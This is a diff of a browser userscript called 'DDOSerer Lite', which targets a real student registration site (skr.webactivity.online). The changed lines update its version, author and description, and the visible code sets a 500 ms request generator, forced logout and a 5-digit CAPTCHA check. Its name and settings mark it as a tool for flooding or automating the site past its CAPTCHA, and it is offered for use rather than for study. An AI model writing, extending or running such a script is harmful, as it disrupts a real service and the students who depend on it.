@@ -1,7 +1,8 @@
 // ==UserScript==
 // @name         DDOSerer Lite
-// @version      1.0.0
-// @description  Completely Rewritten!
+// @version      1.0.0a
+// @author       Peemai545
+// @description  Guess who's back? The DDOSer(er) returns!
 // @namespace    http://tampermonkey.net/
 // @match        https://skr.webactivity.online/*/
 // @match        https://skr.webactivity.online/*/register_main.php
@@ -18,7 +19,7 @@
 	const logoutLists = ["https://skr.webactivity.online/student/register_logout.php",];
   
 	const AlwaysLogout = true;
-	const HostID = 52545;
+	const HostID = 52545; // You can edit this but I won't so it doesn't break
 	const GeneratorEnabled = true;
 	const GeneratorInterval = 500;
   
@@ -41,9 +42,7 @@
 		} else {
 		  throw new Error("Error: CAPTCHA length is not 5 digits");
 		}
-	  } catch (error) {
-		throw error;
-	  }
+	  } catch (error) {throw error;}
 	}
   
 	async function Inputter() {
